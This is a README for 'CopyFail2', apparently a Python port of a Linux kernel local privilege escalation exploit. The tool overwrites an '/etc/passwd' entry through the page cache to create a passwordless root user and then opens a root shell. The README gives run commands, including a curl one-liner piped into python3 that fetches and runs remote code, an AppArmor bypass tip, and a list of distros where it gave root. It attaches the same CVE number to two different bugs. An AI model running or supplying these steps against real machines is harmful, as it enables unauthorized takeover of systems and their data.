# CopyFail2 (CVE-2026-31431) - Python Implementation

Python port of the CopyFail2 kernel exploit leveraging xfrm ESP-in-UDP `MSG_SPLICE_PAGES` no-COW fast path for unprivileged Linux local privilege escalation.

Replaces a nologin/false entry in `/etc/passwd` with a passwordless uid-0 user and drops into a root shell via `su`.

## Vulnerability

The kernel bug resides in the UDP splice path used by xfrm ESP-in-UDP encapsulation. `splice()` into a UDP socket with `MSG_SPLICE_PAGES` causes pages to be mapped into the receiver's page cache without triggering copy-on-write. This allows writing into any file currently mapped in the page cache, even when opened read-only.

- Original C implementation: [0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo](https://github.com/0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo)
- Upstream fix: [netdev/net.git](https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4)

## Requirements

- Linux kernel >= 6.5 (MSG_SPLICE_PAGES UDP support)
- `libcrypto.so` (OpenSSL)
- Python 3.8+
- `CAP_NET_ADMIN` or the ability to create user namespaces

## Which version to use

This repo provides two variants. Both produce the same result; pick based on your constraints.

| File | Description | Speed | Use when |
|------|-------------|-------|----------|
| `exploit.py` | **Optimized** — reuses xfrm state/sockets/pipe across mutations, batches 2 consecutive bytes per round, active polling instead of fixed sleep. | ~3–8 s for a 99-byte line | Default choice. Fast, stable, tested on multiple distros. |
| `exploit_raw.py` | **Reference** — closest to the original C code. Recreates xfrm state, sockets, pipe and temp file for **every single byte**, fixed 200 ms sleep per mutation. | ~30–40 s for a 99-byte line | Use if you want the simplest possible code path for auditing, or if the optimized version misbehaves on a specific kernel build. |

### Quick start (optimized)

```bash
# One-liner via pipe
python3 -c "$(curl -sL https://raw.githubusercontent.com/youruser/yourrepo/main/exploit.py)"

# Saved file
python3 exploit.py

# Revert changes
python3 exploit.py --clean
```

### Quick start (raw/reference)

```bash
python3 exploit_raw.py
python3 exploit_raw.py --clean
```

On Ubuntu with `apparmor_restrict_unprivileged_userns` enabled, save the file first and run from disk; the pipe mode skips the AppArmor bypass dance.

```bash
curl -sL https://raw.githubusercontent.com/youruser/yourrepo/main/exploit.py > /tmp/x.py
python3 /tmp/x.py
```

## How it works

1. Brute-forces an AES-GCM IV whose keystream byte XORs the original `/etc/passwd` byte into the desired value.
2. Installs a local xfrm ESP-in-UDP state on `127.0.0.1:4500`.
3. Crafts an attacker-controlled backing file containing the forged ESP header and ICV.
4. `splice()`s three ranges (ESP header, target byte from `/etc/passwd`, ICV) into a pipe.
5. `splice()`s the pipe into the UDP socket, triggering the kernel bug and writing the byte into the page cache.
6. Repeats for every differing byte to overwrite a `nologin`/`false` line with `sick::0:0:...:/:/bin/bash`.
7. `su - sick` drops into root (PAM `nullok` accepts empty password).

## Tested

| Distro            | Kernel                    | Result |
|-------------------|---------------------------|--------|
| Ubuntu 24.04 LTS  | 6.8.0-110-generic         | root   |
| Debian 13         | 6.12.74                   | root   |
| Arch              | 6.19.11-arch1-1           | root   |
| Fedora 43         | 6.19.14-200.fc43          | root   |
| Ubuntu 26.04 LTS  | 7.0.0-15-generic          | root   |
| Ubuntu 22.04 LTS  | 5.15.0-176-generic        | not vuln |

## Troubleshooting

**`cannot acquire CAP_NET_ADMIN`**

Your kernel may have `kernel.unprivileged_userns_clone=0`. Enable it:

```bash
sudo sysctl kernel.unprivileged_userns_clone=1
```

If running inside Docker, start the container with `--privileged` or `--cap-add=SYS_ADMIN`.

## Credits

- Hyunwoo Kim (imv4bel) and Kuan-Ting Chen — discovery and upstream fix
- Steffen Klassert — IPsec maintainer, posted the fix
- Brad Spengler / grsecurity — coined "copyfail-class"
- Theori / Xint — original Copy Fail (CVE-2026-31431)
- Original C exploit by 0xdeadbeefnetwork

## Disclaimer

This tool is provided for authorized security research and educational purposes only. Do not use against systems you do not own or have explicit permission to test. The authors assume no liability for misuse or damage caused by this software.
